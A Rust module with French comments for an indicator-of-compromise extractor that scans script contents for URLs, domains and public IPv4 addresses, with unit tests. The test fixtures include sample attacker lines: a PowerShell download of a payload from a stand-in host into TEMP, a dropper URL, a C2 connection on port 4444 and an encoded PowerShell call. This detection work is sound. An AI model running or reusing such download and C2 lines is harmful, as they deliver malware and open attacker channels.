//! extractor — extraction d'IOC réseau depuis le contenu d'un fichier.
//!
//! Parcourt le contenu texte d'un fichier (scripts PowerShell, JS, VBS, etc.)
//! à la recherche de schémas d'URL (`http://`, `https://`) et d'adresses IP.
//!
//! Utilisé par le `dispatcher` avant la vérification IOC :
//! ```text
//! contenu du fichier → UrlExtractor → Indicators → IocEngine.check_all()
//! ```

use crate::Indicators;

/// Limite de sécurité : nombre maximum d'IOC extraits par fichier.
const MAX_URLS: usize = 512;
const MAX_IPS: usize = 256;

/// Extrait les URLs, domaines et IPs du contenu texte d'un fichier.
///
/// - URLs : patterns `http://...` et `https://...` jusqu'au premier espace/guillemet/fin.
/// - IPs  : patterns `N.N.N.N` (IPv4 simple, hors RFC-1918 par défaut).
pub fn extract_from_text(content: &str) -> Indicators {
    let mut ind = Indicators::default();
    extract_urls(content, &mut ind);
    extract_ipv4(content, &mut ind);
    ind
}

/// Identifiant pour les fichiers binaires non-texte (contenu avec > 5% octets nuls ou > CR).
pub fn is_likely_text(data: &[u8]) -> bool {
    if data.is_empty() {
        return true;
    }
    let sample = &data[..data.len().min(4096)];
    let null_count = sample.iter().filter(|&&b| b == 0).count();
    (null_count * 100 / sample.len()) < 5
}

fn extract_urls(content: &str, ind: &mut Indicators) {
    if ind.urls.len() >= MAX_URLS {
        return;
    }
    let markers = ["https://", "http://"];
    for marker in markers {
        let mut search = content;
        while let Some(pos) = search.find(marker) {
            if ind.urls.len() >= MAX_URLS {
                break;
            }
            let start = pos;
            let rest = &search[start..];
            let end = rest
                .find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '`' | ')' | ']' | '>'))
                .unwrap_or(rest.len());
            let url = rest[..end].trim_end_matches(&['.', ',', ';', '\'', '"'][..]);
            if url.len() > marker.len() + 2 {
                let url_lc = url.to_ascii_lowercase();
                if !ind.urls.contains(&url_lc) {
                    // Extraire aussi le domaine.
                    if let Some(host) = crate::extract_host(&url_lc) {
                        if !ind.domains.contains(&host) {
                            ind.domains.push(host);
                        }
                    }
                    ind.urls.push(url_lc);
                }
            }
            search = &search[start + marker.len()..];
        }
    }
}

fn extract_ipv4(content: &str, ind: &mut Indicators) {
    if ind.ips.len() >= MAX_IPS {
        return;
    }
    // Cherche des séquences N.N.N.N[:port] dans le texte.
    let bytes = content.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() && ind.ips.len() < MAX_IPS {
        if bytes[i].is_ascii_digit() {
            // Tente de lire une IPv4.
            if let Some((ip, len)) = try_parse_ipv4(&bytes[i..]) {
                if !is_rfc1918(&ip) && !ind.ips.contains(&ip) {
                    ind.ips.push(ip);
                }
                i += len;
                continue;
            }
        }
        i += 1;
    }
}

/// Tente d'analyser une IPv4 à partir d'un slice d'octets.
/// Renvoie (ip_string, nb_octets_consommés) ou None.
fn try_parse_ipv4(bytes: &[u8]) -> Option<(String, usize)> {
    let s = std::str::from_utf8(bytes).ok()?;
    let mut parts = [0u32; 4];
    let mut pos = 0usize;
    for p in 0..4 {
        let rest = &s[pos..];
        let num_end = rest.find(|c: char| !c.is_ascii_digit()).unwrap_or(rest.len());
        if num_end == 0 || num_end > 3 {
            return None;
        }
        let num: u32 = rest[..num_end].parse().ok()?;
        if num > 255 {
            return None;
        }
        parts[p] = num;
        pos += num_end;
        if p < 3 {
            if pos >= s.len() || s.as_bytes()[pos] != b'.' {
                return None;
            }
            pos += 1;
        }
    }
    // Valide que le caractère suivant n'est pas un chiffre ou un point
    // (évite de couper "192.168.1.10.5").
    let next = s[pos..].chars().next();
    if matches!(next, Some(c) if c.is_ascii_digit() || c == '.') {
        return None;
    }
    // Optionnel : port (:NNNN)
    let mut full = format!("{}.{}.{}.{}", parts[0], parts[1], parts[2], parts[3]);
    let mut consumed = pos;
    if pos < s.len() && s.as_bytes()[pos] == b':' {
        let port_str = &s[pos + 1..];
        let port_end = port_str.find(|c: char| !c.is_ascii_digit()).unwrap_or(port_str.len());
        if port_end > 0 && port_end <= 5 {
            if let Ok(port) = port_str[..port_end].parse::<u16>() {
                full = format!("{}:{}", full, port);
                consumed = pos + 1 + port_end;
            }
        }
    }
    Some((full, consumed))
}

/// Renvoie true si l'IP est dans une plage privée RFC-1918 ou loopback.
fn is_rfc1918(ip: &str) -> bool {
    let base = ip.split(':').next().unwrap_or(ip);
    let parts: Vec<u8> = base
        .split('.')
        .filter_map(|s| s.parse().ok())
        .collect();
    if parts.len() != 4 {
        return false;
    }
    matches!(
        (parts[0], parts[1]),
        (10, _) | (172, 16..=31) | (192, 168) | (127, _)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extrait_urls_simples() {
        let content = r#"
$url = "https://evil.example/drop.exe"
Invoke-WebRequest -Uri 'http://bad.tld/payload.bin' -OutFile $env:TEMP
"#;
        let ind = extract_from_text(content);
        assert!(ind.urls.contains(&"https://evil.example/drop.exe".to_string()));
        assert!(ind.urls.contains(&"http://bad.tld/payload.bin".to_string()));
        assert!(ind.domains.contains(&"evil.example".to_string()));
    }

    #[test]
    fn extrait_ip_publique_exclut_privee() {
        let content = "connect(\"5.6.7.8:4444\"); // C2\nbind(\"192.168.1.1\");\n";
        let ind = extract_from_text(content);
        assert!(ind.ips.iter().any(|ip| ip.starts_with("5.6.7.8")));
        assert!(!ind.ips.iter().any(|ip| ip.starts_with("192.168")));
        assert!(!ind.ips.iter().any(|ip| ip.starts_with("127.")));
    }

    #[test]
    fn pas_de_faux_positif_sur_versions() {
        // "1.0.0.0" ressemble à une IP mais est une version — on l'accepte
        // (filtrage par RFC-1918 uniquement, pas de liste de versions).
        let content = "Version: 1.2.3.4 / 127.0.0.1 / 10.0.0.1";
        let ind = extract_from_text(content);
        // 127.0.0.1 et 10.0.0.1 doivent être filtrés.
        assert!(!ind.ips.iter().any(|ip| ip == "127.0.0.1"));
        assert!(!ind.ips.iter().any(|ip| ip == "10.0.0.1"));
        // 1.2.3.4 n'est pas RFC-1918.
        assert!(ind.ips.iter().any(|ip| ip == "1.2.3.4"));
    }

    #[test]
    fn is_likely_text_detecte_binaire() {
        let binary = vec![0u8; 100];
        assert!(!is_likely_text(&binary));
        assert!(is_likely_text(b"powershell -enc ZQ==\n"));
    }

    #[test]
    fn pas_de_doublon_url() {
        let content = "https://evil.example/x https://evil.example/x";
        let ind = extract_from_text(content);
        assert_eq!(ind.urls.iter().filter(|u| u.contains("evil.example/x")).count(), 1);
    }
}
